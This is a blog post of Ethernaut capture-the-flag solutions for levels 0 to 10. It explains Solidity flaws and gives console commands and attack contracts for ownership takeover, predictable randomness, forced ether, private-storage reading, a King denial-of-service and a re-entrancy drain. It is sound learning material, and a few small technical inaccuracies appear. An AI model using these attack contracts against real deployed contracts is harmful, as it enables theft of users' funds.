---
title: Ethernaut Solutions
date:  2024-03-03 19:09:09
mathjax: true
tags:
  - "Ethereum"
  - "Solidity"

mermaid: true
---
<html>
  <head>
    <script type="text/javascript" async
  src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML">
    </script>


<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS_HTML">
  MathJax.Hub.Config({
    "HTML-CSS": {
      availableFonts: ["TeX"],
    },
    tex2jax: {
      inlineMath: [['$','$'],["\\(","\\)"]]},
      displayMath: [ ['$$','$$'], ['\[','\]'] ],
    TeX: {
      extensions: ["AMSmath.js", "AMSsymbols.js", "color.js"],
      equationNumbers: {
        autoNumber: "AMS"
      }
    },
    showProcessingMessages: false,
    messageStyle: "none",
    imageFont: null,
    "AssistiveMML": { disabled: true }
  });
</script>
</head>
</html>

------

I recently started learning Solidity and exploring blockchain security and came across the Ethernaut Challenges. It is probably the best place to hone your coding skills in Solidity and also to gain some beginner level hands-on experience on various kinds of bugs and exploits that can make smart contracts vulnerable. Hence, a fun way to spend the weekends until I am ready to actually start smart-contract auditing.

I have created this blog-post to document the solutions to the ethernaut challenges that I have solved. I have come across tons of articles, blogs and youtube videos where the solution to these challenges have already been discussed. So, I am quite sure that you will find much better ones out there with detailed explanations, but this is my personal take on these challenges and also a way to document them for future reference.

Happy reading!

___
## Level 0 [Hello World]

This is the 0th level where the entire level focusses on walking through the basics of how to play the game. Starting from setting up a Metamask wallet to using the browser's console to interact with the smart contract this is one of the most important levels to understand how to play the game. To give a flavour of the upcoming exercises, a very simple challenge has been showcased in this level, wherein we will be required to call various functions present in the contract, starting from the `info()` method to ultimately get our hands on a password which needs to be passed to the `authenticate()` method to complete the level.
Below is the list of commands we need to enter into the console to complete the level:

```javascript
await contract.info()

await contract.info1()

await contract.info2()

await contract.infonum()

await contract.info42()

await contract.theMethodname()

await contract.method7123949()

await contract.password()

await contract.authenticate("ethernaut0")
```

___
## Level 1 [Fallback]

This level requires us to claim ownership of this contract and reduce all of it’s balance to 0. To do so, if we inspect the contract, we will notice that the owner variable gets modified in the `receive()` function of the contract.

```solidity
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```

However, we will need to satisfy two conditions to become the owner. The first is that, we will need to send some value of ether to the contract and the second is that the value of contributions mapped to us must be greater than 0 in the contributions mapping. Let us start with the second condition. To make `contributions[msg.sender] > 0`, we will need to call the `contribute()` method.

```solidity
  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
```

To successfully call the contribute function, we will need to fulfil the `require(msg.value < 0.001 ether)` condition, by sending some value of ether less than 0.001 ETH.
NOTE – We might wonder why not simply satisfy the `if` condition in the `contribute()` function to change the owner variable. That is not possible because of the `contributions[msg.sender] = 1000 * (1 ether)` statement in the constructor of the contract, which will allocate a much higher value of contributions to the owner.
Once the value of contributions mapped to us is greater than 0 in the contributions mapping, we can satisfy the first condition in the `receive()` function, by sending some ETH to the contract. This will change the ownership of the contract. Now we can simply call the `withdraw()` function to withdraw all of the balance in the contract.
For solving the challenge using the browser’s developer console, find the commands given below :

```javascript
await contract.contribute({value: 1})

await contract.send(1)

await contract.withdraw()
```

Note that we can also complete this challenge by using remix to deploy the contract at the instance address and then manually calling the required functions. Since we can’t call the `receive()` method manually, we can use the transact button in the low level interactions section under the deploy tab in remix to send some ETH to the contract and make a transaction.

___
## Level 2 [FALLOUT]

This challenge illustrates a solidity bug that can’t be seen in recent days anymore. In older versions of solidity, constructors were defined as functions that had the same name as the contract that contained them. Thus, when a contract name got changed in development, if the constructor name wasn't changed, it became a normal, callable function. This gave rise to some fatal vulnerabilities in the contract, as we can see in this challenge.
The objective of this challenge is to claim ownership of the contract. Notice, the version of the challenge contract `pragma solidity ^0.6.0`. This is very old in comparison to the current version and as said earlier, this version employs a function with the same name as the contract as a constructor. If we notice carefully, the contract name is `Fallout`, whereas, the function that was supposed to be the constructor is named `Fal1out`. Due to the misspelled function name, this contract has become rather easy to exploit.

```solidity
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```

If we simply call the `Fal1out()` method, we can claim ownership of this contract.
This can be done in two ways –
For completing the challenge using the browser’s developer console, find the commands listed below :

```javascript
await contract.Fal1out()
```

For completing this challenge using remix, find the smart contract below :

```solidity
pragma solidity ^0.8
interface IFallout {
    function Fal1out() external payable;
}
```

This contract uses interface to make an external call to the `Fal1out` method in our challenge contract. If we deploy this contract at our instance address, and call the `Fal1out` method manually, we will become the owner of this contract.

___
## Level 3 [Coin Flip]

This level is aimed at showing that all transactions on the Ethereum blockchain are deterministic state transition operations, meaning that every transaction modifies the global state of the Ethereum ecosystem and it does so in a calculable way with no uncertainty. Hence, there is no existence of randomness in a blockchain. Also, when a contract is deployed on the blockchain, the code is visible to everyone, so figuring out the outcome of an apparently random code generator is really easy, and in reality not random at all.
This challenge is a coin flipping game, and we have to guess the outcome of the coin flip correctly 10 times in a row to pass the challenge. The `flip()` method takes an input of type Boolean which is the guess and checks it against the outcome of an algorithm which uses block number to generate a result.

```solidity
  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
```

So, it is very easy to guess the outcome of the algorithm before-hand since we already know what the algorithm is. We just need to create an attack contract to use the same algorithm to generate a guess and submit it to the `flip()` method.
Find the attack contract below :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract hack {
    CoinFlip private immutable target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor (address _target) {
        target = CoinFlip(_target);
    }

    function flip() external {
      bool guess = _guess();
      require(target.flip(guess), "guess failed");        
    }


    function _guess() private view returns (bool) {
        uint256 lastHash = uint256(blockhash(block.number - 1));
        uint256 coinFlip = lastHash / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}
```

Notice, we have used the same algorithm as in the challenge contract to generate a guess.
If the hack contract is deployed in the instance address, and the `flip()` function is called 10 times, we will be able to complete the challenge.

A very tempting choice would be to automate the function calling part using a loop instead of manually doing it. I even tried to do it, but I couldn't as the block was not being mined, most likely due to insufficient gas. Calling functions inside a loop can be quite expensive on gas and is not recommended.

___
## Level 4 [Telephone]

This level is all about the confusion regarding `tx.origin` and `msg.sender`.
`tx.origin` is a global variable that holds the address of the account that originally sent the call or transaction, while, `msg.sender` holds the address of the immediate caller. For example, if Tom calls a function in contract A which in turn calls a function in contract B, then, `tx.origin = Tom`, while `msg.sender = contract A`.
`Tom -> A -> B`
The objective of this challenge is to claim ownership of the contract. If we check where the `owner` variable gets assigned in the contract, we will notice that we can change the value of the `owner` variable using the function `changeOwner()`, however, we will need satisfy the condition `if (tx.origin != msg.sender)`.

```solidity
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
```

This means, we can simply use an external contract to call the `changeOwner()` function and pass our account’s address to claim ownership of the contract.

Find the attack contract below :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract hack {
    Telephone private immutable target;

    constructor (address _target) {
        target = Telephone(_target);
    }

    function attack() external {
        target.changeOwner(tx.origin);
    }
}
```

It is necessary to use an external contract to complete this challenge, as if we try to call the `changeOwner()` function directly, `tx.origin` and `msg.sender` bothwill point to our account's address, hence the check in the challenge contract will fail.

___
## Level 5 [Token]

This level aims to show us how an overflow/underflow attack works. The compiler version for the challenge contract is `^0.6.0`, which doesn’t support the safemath library, making the contract vulnerable to overflow/underflow attacks if proper checks are not performed.
The objective of this challenge is to increase the number of tokens from 20 to an obscenely high number for our address. If we look at the contract, we will notice that `balances[msg.sender]` gets updated in the `transfer()` function.

```solidity
  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }
``` 

Since we have 20 tokens for our address initially, we can easily transfer 21 tokens to any random address, so that an underflow takes place. `20 – 21 = -1`, but, here, since we are using uint which defaults to uint256, instead of getting `-1`, we will get `2^256`.

Find the attack contract below :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IToken {
    function balanceOf(address _owner) external view returns (uint balance);

    function transfer(address _to, uint _value) external returns (bool);
}
```

If this contract is deployed at the instance address, and 21 tokens are transferred to any random address, we will gain a huge number of tokens and hence complete the challenge.

___
## Level 6 [Delegation]

This level is about using delegatecall, which is a lowlevel function in solidity. When contract A executes delegatecall to contract B, B's code is executed with contract A's storage, msg.sender and msg.value. This is a very useful tool that can be used to load code into already running contracts in the blockchain.

To complete the level, we will need to claim ownership of the delegation contract. If we look at the code, we will notice that inside the fallback function, a delegate has already been setup to the delegate contract.

```solidity
  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
```
So, we will just need to execute the fallback function and call the `pwn()` function from the delegate contract. We can do this ba making a low-level transaction in remix or in the developer console and passing the encoded function signature for `pwn()` as the msg.data. This can be done in remix in a contract using `abi.encodeWithSignature("<function name>", inputs)`, or in the developer console using the web3 library - `web3.eth.abi.encodeFunctionSignature(functionName)`.

I completed this challenge using the developer console. Find the list of commands below :

```javascript
await web3.eth.abi.encodeFunctionSignature("pwn()");

await contract.sendTransaction({data: "0xdd365b8b"});
```

___
## Level 7 [Force]

This level shows the utility of the self-destruct that can be used to force send ether to any contract. If we create a contract with some balance, and then self-destruct it, while passing the instance address as the argument to `selfdestruct()`, we will be able to forcefully send ether to the challenge contract even though it doesn’t have a fallback or receive function.
Find the attack contract below :
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract hack {
    constructor () payable {}

    function kill(address _to) public {
        selfdestruct(payable(_to));
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}
```
Send some ether to the contract while deploying it. If we want, we can check the balance of the contract using the helper function. Call kill and pass the challenge contract’s address to send ether to it.
NOTE – In the current version of solidity, `0.8.20` `selfdestruct()` doesn’t delete the contract unless it is executed in the same transaction in which the contract was created. It just sends all the ether present in the contract to the address specified.

___
## Level 8 [Vault]

This level shows that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.

web3.js is a collection of libraries that allows us to interact with a local or remote ethereum node using HTTP, IPC or WebSocket. We can use this library to fetch the value of the password variable which was set using the constructor when the contract was deployed, even though it is private.

I have completed this challenge using the developer console. Find the list of commands below -

```javascript
await web3.eth.getStorageAt(contract.address, 1)

await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
```

The details about the first command above can be found in the [web3 Documentation](https://web3js.readthedocs.io/en/v1.10.0/).

The '1' argument in that command is for the storage slot whose value we are interested in. In our case, it is '1' since we want the value of the password variable, and it is stored in the 1st slot, while, the locked variable is stored in the 0th slot, as we can see in the challenge contract.

After we get the value of the password variable from the first command, we pass it to the unlock function to unlock the contract.

___
## Level 9 [King]

This level illustrates a very important feature of the `transfer()` function that is used to transfer ether in solidity. It is very important to understand that a `transfer()` function fails if there is no `payable` `fallback()` or `receive()` function in the recipient contract and the transaction is reverted.

In the challenge contract, if someone wants to change the value of the king variable and hence become the king of the contract he/she will need to send some amount of ether to the contract which is greater in value than the prize variable. To complete the challenge, we will need to do something so that no other person is able to claim the kingship of the contract by changing the value of the king variable.

```solidity
  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
```

In this code fragment, we can see that the value of the king variable changes once thereis a successful transfer of the prize amount to the previous king. This is done using the `transfer()` function. And, like discussed above, a `transfer()` function fails if there is no `payable` `fallback()` or `receive()` function in the recipient contract. So, we can stop the change of the value of the king variable by stopping the `transfer()` function from executing and sending us the prize ether.

```solidity
contract hack {
    constructor (address payable target) payable {
        uint prize = King(target).prize();
        (bool success, ) = target.call{value: prize}("");
        require(success, "call failed");
    }
}
```

If we implement this hack contract, the `call()` function will change the king variable from to our address. Now, notice that there is no `payable` `fallback()` or `receive()` function in the recipient contract. Hence, whenever the challenge contract tries to transfer ether to this contract it will fail and the transaction will be reverted. Hence, the value of the king variable won't change in the next line of the challenge contract as that line of code won't be executed. We just need to deploy this contract in the instance address and submit the instance to complete the challenge.

NOTE - If `send()` or `call()` was used instead of `transfer()` in the challenge contract, the transfer of ether would fail if there was no `payable` `fallback()` or `receive()` function in the recipient contract. But, it won't revert, so the remaining lines of code in the code fragment would be executed. So, in case of `send()` or `call()`, it is vital to check the return value from these functions. This is a very important difference between `send()` or `call()` and `transfer()`, all three being used for transferring ether. I am still thinking of what implications and differences this might have in terms of security issues for a smart contract.

___
## Level 10 [Re-entrancy]

This level helps us understand the classic re-entrancy attack (one of my favourites).

A re-entrancy attack is a recursive attack that can be done on contracts in which the state variables associated with the balance of an address are modified after the ether is transferred. We can see that in our case, the challenge contract is susceptible to this type of attack because the balance of `msg.sender` is updated only after the ether has been transferred in the balances mapping. Re-entrancy attacks are done by recursively executing code inside a `receive()` or a `fallback()` function, that basically calls functions in the victim contract to send ether to the attacking contract. When ether is sent, these functions are executed which in turn executes the code inside their body calling functions in the victim contract again to withdraw ether. This recursive process goes on untill the balance of the victim contract becomes 0.

Find my attack contract below -

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IReentrancy {
    function donate(address) external payable;
    function withdraw(uint) external;
}

contract hack {
    IReentrancy private immutable target;

    constructor (address _target) {
        target = IReentrancy(_target);
    }

    function attack () external payable {
        target.donate{value: 1e18}(address(this));
        target.withdraw(1e18);

        require (address(target).balance == 0, "target balance > 0");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint amount = min (1e18, address(target).balance);
        if (amount>0) {
            target.withdraw(amount);
        }
        
    }

    function min (uint x, uint y) private pure returns(uint) {
        return (x>y? y : x);
    }
}
```

The attack function first sends some ether to the challenge contract in order to have some balance against the Hack contract's address in the balances mapping using the `donate()` function. The `withdraw()` function is then called, which will invoke the receive function, which again calls the withdraw function. The `min()` function is used to determine the minimum amount that can be withdrwan from the contract. This recursive calling continues until the balance of the challenge contract is 0. Notice, I also used the selfdestruct function to return all the ether I spent to my wallet again.

Re-entrancy is one of the most simple and popular attacks till date. To prevent re-entrancy we should always update the balances and state variables before sending out ether. Other techniques like invoking a lock of the contract untill a particular transaction is completed can also be useful.

___

# More solutions coming soon!
